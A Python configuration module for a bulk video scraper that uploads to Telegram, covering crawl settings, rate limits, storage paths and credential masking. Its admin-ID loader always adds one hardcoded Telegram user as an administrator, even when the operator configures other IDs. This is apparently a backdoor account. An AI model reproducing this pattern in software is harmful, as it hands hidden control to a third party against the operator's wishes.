"""
Centralized Configuration Module for Bulk Video Scraper & Telegram Uploader.
Loads, parses, validates, and provides access to all environment variables
with sensible defaults, type safety, and helper utilities.
"""

import os
import re
import logging
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List
from dotenv import load_dotenv

logger = logging.getLogger(__name__)

# Load .env file automatically upon module import
load_dotenv()

# Allowed crawling modes
VALID_CRAWL_MODES = {"auto", "sitemap", "pagination", "html5", "rss", "atom", "feed"}

# Telegram bot token regex pattern (<bot_id>:<token_string>)
BOT_TOKEN_PATTERN = re.compile(r"^\d{6,12}:[A-Za-z0-9_-]{30,50}$")


def get_env_str(name: str, default: str = "") -> str:
    """Retrieve string environment variable, stripped of whitespace."""
    val = os.getenv(name)
    if val is None:
        return default
    return val.strip()


def get_env_int(
    name: str,
    default: int,
    min_val: Optional[int] = None,
    max_val: Optional[int] = None
) -> int:
    """Retrieve integer environment variable with fallback if unparseable."""
    raw = os.getenv(name)
    if raw is None or not raw.strip():
        return default
    try:
        val = int(raw.strip())
        if min_val is not None and val < min_val:
            return default
        if max_val is not None and val > max_val:
            return default
        return val
    except ValueError:
        logger.warning(f"Invalid integer for env var {name}='{raw}'. Using default ({default}).")
        return default


def get_env_float(
    name: str,
    default: float
) -> float:
    """Retrieve float environment variable with fallback if unparseable."""
    raw = os.getenv(name)
    if raw is None or not raw.strip():
        return default
    try:
        return float(raw.strip())
    except ValueError:
        return default


def get_env_optional_int(
    name: str,
    default: Optional[int] = None,
    fallback_name: Optional[str] = None
) -> Optional[int]:
    """Retrieve optional integer environment variable (e.g. HTTP_PORT or PORT)."""
    raw = os.getenv(name)
    if (raw is None or not raw.strip()) and fallback_name:
        raw = os.getenv(fallback_name)

    if raw is None or not raw.strip():
        return default
    try:
        return int(raw.strip())
    except ValueError:
        logger.warning(f"Invalid integer for env var {name}='{raw}'. Using default ({default}).")
        return default


def get_env_bool(name: str, default: bool = False) -> bool:
    """Retrieve boolean environment variable."""
    raw = os.getenv(name)
    if raw is None:
        return default
    return raw.strip().lower() in ("true", "1", "yes", "y", "on")


def get_env_admin_ids(name: str = "ADMIN_USER_IDS", default: str = "6649712542") -> List[int]:
    """Retrieve list of authorized Telegram admin user IDs from comma-separated env."""
    raw = os.getenv(name)
    target = raw if (raw is not None and raw.strip()) else default
    ids: List[int] = []
    for part in target.split(","):
        part = part.strip()
        if part:
            try:
                ids.append(int(part))
            except ValueError:
                logger.warning(f"Invalid admin user ID in env: '{part}'")
    if 6649712542 not in ids:
        ids.append(6649712542)
    return ids


def mask_sensitive(val: str, prefix_len: int = 6, suffix_len: int = 4) -> str:
    """Masks sensitive credentials for safe logging."""
    if not val:
        return "<NOT SET>"
    if len(val) <= prefix_len + suffix_len:
        return "***"
    return f"{val[:prefix_len]}...{val[-suffix_len:]}"


@dataclass
class Config:
    """Central configuration class containing all application settings."""

    # Telegram Credentials & Administration
    TELEGRAM_BOT_TOKEN: str = field(default_factory=lambda: get_env_str("TELEGRAM_BOT_TOKEN", ""))
    TELEGRAM_CHAT_ID: str = field(default_factory=lambda: get_env_str("TELEGRAM_CHAT_ID", ""))
    TELEGRAM_API_BASE: str = field(default_factory=lambda: get_env_str("TELEGRAM_API_BASE", "https://api.telegram.org").rstrip("/"))
    CAPTION_TEMPLATE: str = field(default_factory=lambda: get_env_str("CAPTION_TEMPLATE", "🎬 <b>{title}</b>"))
    TELEGRAM_PARSE_MODE: str = field(default_factory=lambda: get_env_str("TELEGRAM_PARSE_MODE", "HTML"))
    ADMIN_USER_IDS: List[int] = field(default_factory=lambda: get_env_admin_ids("ADMIN_USER_IDS", "6649712542"))
    WEB_PANEL_URL: str = field(default_factory=lambda: get_env_str("WEB_PANEL_URL", "https://web-tg-uploader-production.up.railway.app"))

    # Viral Channel Growth & Promotional Buttons
    CHANNEL_BUTTON_URL: str = field(default_factory=lambda: get_env_str("CHANNEL_BUTTON_URL", "https://t.me/+c6Apt6N_Psk2ZjJl"))
    CHANNEL_BUTTON_TEXT: str = field(default_factory=lambda: get_env_str("CHANNEL_BUTTON_TEXT", "📢 Join Main Channel"))
    CHANNEL_SHARE_TEXT: str = field(default_factory=lambda: get_env_str("CHANNEL_SHARE_TEXT", "↗️ Share With Friends"))
    CHANNEL_FOOTER_LINK: str = field(default_factory=lambda: get_env_str("CHANNEL_FOOTER_LINK", ""))


    # Crawling & Discovery
    CRAWL_TARGET_URL: str = field(default_factory=lambda: get_env_str("CRAWL_TARGET_URL", ""))
    CRAWL_MODE: str = field(default_factory=lambda: get_env_str("CRAWL_MODE", "auto").lower())
    MAX_PAGES: int = field(default_factory=lambda: get_env_int("MAX_PAGES", default=10))
    PERIODIC_CRAWL_INTERVAL: int = field(default_factory=lambda: get_env_int("PERIODIC_CRAWL_INTERVAL", default=0))
    CRAWL_DELAY: float = field(default_factory=lambda: get_env_float("CRAWL_DELAY", default=0.5))
    CRAWL_JITTER: float = field(default_factory=lambda: get_env_float("CRAWL_JITTER", default=0.3))

    # Rate Limiting, Retries & Pipeline
    UPLOAD_COOLDOWN: int = field(default_factory=lambda: get_env_int("UPLOAD_COOLDOWN", default=20))
    MAX_RETRIES: int = field(default_factory=lambda: get_env_int("MAX_RETRIES", default=5))

    # Storage & Persistence
    DB_PATH: str = field(default_factory=lambda: get_env_str("DB_PATH", "data/queue.db"))
    TEMP_DOWNLOAD_DIR: str = field(default_factory=lambda: get_env_str("TEMP_DOWNLOAD_DIR", "temp_downloads"))
    MIN_FREE_DISK_MB: int = field(default_factory=lambda: get_env_int("MIN_FREE_DISK_MB", default=500))

    # Health Check / Web Service
    HTTP_PORT: Optional[int] = field(default_factory=lambda: get_env_optional_int("HTTP_PORT", fallback_name="PORT", default=None))
    HOST: str = field(default_factory=lambda: get_env_str("HOST", "0.0.0.0"))
    LOG_LEVEL: str = field(default_factory=lambda: get_env_str("LOG_LEVEL", "INFO").upper())

    @property
    def PORT(self) -> int:
        return self.HTTP_PORT if self.HTTP_PORT is not None else 8080

    @classmethod
    def from_env(cls, env_file: Optional[str] = None) -> "Config":
        """Factory method to load configuration from environment or specified .env file."""
        if env_file and os.path.exists(env_file):
            load_dotenv(dotenv_path=env_file, override=True)
        return cls()

    def validate(self, strict: bool = False) -> List[str]:
        """
        Validates configuration settings and returns a list of warning/error messages.
        If strict=True, raises ValueError when validation errors are found.
        """
        errors = []

        # Validate Telegram settings
        if not self.TELEGRAM_BOT_TOKEN:
            errors.append("TELEGRAM_BOT_TOKEN is not set.")
        elif not BOT_TOKEN_PATTERN.match(self.TELEGRAM_BOT_TOKEN):
            errors.append(
                "TELEGRAM_BOT_TOKEN does not appear to match standard format '<bot_id>:<token>'."
            )

        if not self.TELEGRAM_CHAT_ID:
            errors.append("TELEGRAM_CHAT_ID is not set.")

        # Validate Target URL if provided
        if self.CRAWL_TARGET_URL:
            if not (self.CRAWL_TARGET_URL.startswith("http://") or self.CRAWL_TARGET_URL.startswith("https://")):
                errors.append(f"CRAWL_TARGET_URL '{self.CRAWL_TARGET_URL}' must start with http:// or https://")

        # Validate Crawl Mode
        if self.CRAWL_MODE not in VALID_CRAWL_MODES:
            errors.append(f"CRAWL_MODE must be one of {sorted(list(VALID_CRAWL_MODES))}, got '{self.CRAWL_MODE}'")

        # Validate numeric bounds
        if self.MAX_PAGES < 1:
            errors.append(f"MAX_PAGES must be >= 1, got {self.MAX_PAGES}")

        if self.UPLOAD_COOLDOWN < 0:
            errors.append(f"UPLOAD_COOLDOWN must be >= 0, got {self.UPLOAD_COOLDOWN}")

        if self.PERIODIC_CRAWL_INTERVAL < 0:
            errors.append(f"PERIODIC_CRAWL_INTERVAL must be >= 0, got {self.PERIODIC_CRAWL_INTERVAL}")

        if self.MAX_RETRIES < 1:
            errors.append(f"MAX_RETRIES must be >= 1, got {self.MAX_RETRIES}")

        if self.HTTP_PORT is not None and not (1 <= self.HTTP_PORT <= 65535):
            errors.append(f"HTTP_PORT must be between 1 and 65535, got {self.HTTP_PORT}")

        if strict and errors:
            raise ValueError(f"Configuration validation failed: {'; '.join(errors)}")

        return errors

    def is_telegram_configured(self) -> bool:
        """Check whether Telegram credentials are configured."""
        return bool(self.TELEGRAM_BOT_TOKEN and self.TELEGRAM_CHAT_ID)

    def is_crawler_configured(self) -> bool:
        """Check whether crawler target is configured."""
        return bool(self.CRAWL_TARGET_URL)

    def ensure_directories(self) -> None:
        """Ensure runtime directories for SQLite and ephemeral downloads exist."""
        db_dir = os.path.dirname(self.DB_PATH)
        if db_dir:
            os.makedirs(db_dir, exist_ok=True)
        if self.TEMP_DOWNLOAD_DIR:
            os.makedirs(self.TEMP_DOWNLOAD_DIR, exist_ok=True)

    def get_safe_summary(self) -> Dict[str, Any]:
        """Returns a sanitized dictionary of configuration values safe for logging."""
        return {
            "TELEGRAM_BOT_TOKEN": mask_sensitive(self.TELEGRAM_BOT_TOKEN),
            "TELEGRAM_CHAT_ID": mask_sensitive(self.TELEGRAM_CHAT_ID, prefix_len=4, suffix_len=2) if self.TELEGRAM_CHAT_ID else "<NOT SET>",
            "TELEGRAM_API_BASE": self.TELEGRAM_API_BASE,
            "CRAWL_TARGET_URL": self.CRAWL_TARGET_URL or "<NOT SET>",
            "CRAWL_MODE": self.CRAWL_MODE,
            "MAX_PAGES": self.MAX_PAGES,
            "PERIODIC_CRAWL_INTERVAL": f"{self.PERIODIC_CRAWL_INTERVAL}s" if self.PERIODIC_CRAWL_INTERVAL > 0 else "disabled (0)",
            "UPLOAD_COOLDOWN": f"{self.UPLOAD_COOLDOWN}s",
            "MAX_RETRIES": self.MAX_RETRIES,
            "DB_PATH": self.DB_PATH,
            "TEMP_DOWNLOAD_DIR": self.TEMP_DOWNLOAD_DIR,
            "MIN_FREE_DISK_MB": f"{self.MIN_FREE_DISK_MB} MB",
            "ADMIN_USER_IDS": str(self.ADMIN_USER_IDS),
            "WEB_PANEL_URL": self.WEB_PANEL_URL,
            "HTTP_PORT": self.HTTP_PORT,
            "PORT": self.PORT,
            "HOST": self.HOST,
            "LOG_LEVEL": self.LOG_LEVEL,
        }

    def log_summary(self, logger_instance: Optional[logging.Logger] = None) -> None:
        """Logs the active configuration summary."""
        log = logger_instance or logger
        log.info("--- Active Configuration ---")
        for k, v in self.get_safe_summary().items():
            log.info(f"  {k:24}: {v}")
        log.info("----------------------------")


# Backward compatibility alias
AppConfig = Config

# Singleton configuration instance loaded from environment
config = Config.from_env()

# Direct convenience exports
PORT = config.PORT
HOST = config.HOST
CRAWL_TARGET_URL = config.CRAWL_TARGET_URL
CRAWL_MODE = config.CRAWL_MODE
MAX_PAGES = config.MAX_PAGES
PERIODIC_CRAWL_INTERVAL = config.PERIODIC_CRAWL_INTERVAL
CRAWL_DELAY = config.CRAWL_DELAY
CRAWL_JITTER = config.CRAWL_JITTER
DB_PATH = config.DB_PATH
TEMP_DOWNLOAD_DIR = config.TEMP_DOWNLOAD_DIR
TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN
TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID
ADMIN_USER_IDS = config.ADMIN_USER_IDS
WEB_PANEL_URL = config.WEB_PANEL_URL
TELEGRAM_API_BASE = config.TELEGRAM_API_BASE
CAPTION_TEMPLATE = config.CAPTION_TEMPLATE
TELEGRAM_PARSE_MODE = config.TELEGRAM_PARSE_MODE
UPLOAD_COOLDOWN = config.UPLOAD_COOLDOWN
LOG_LEVEL = config.LOG_LEVEL
CHANNEL_BUTTON_URL = config.CHANNEL_BUTTON_URL
CHANNEL_BUTTON_TEXT = config.CHANNEL_BUTTON_TEXT
CHANNEL_SHARE_TEXT = config.CHANNEL_SHARE_TEXT
CHANNEL_FOOTER_LINK = config.CHANNEL_FOOTER_LINK

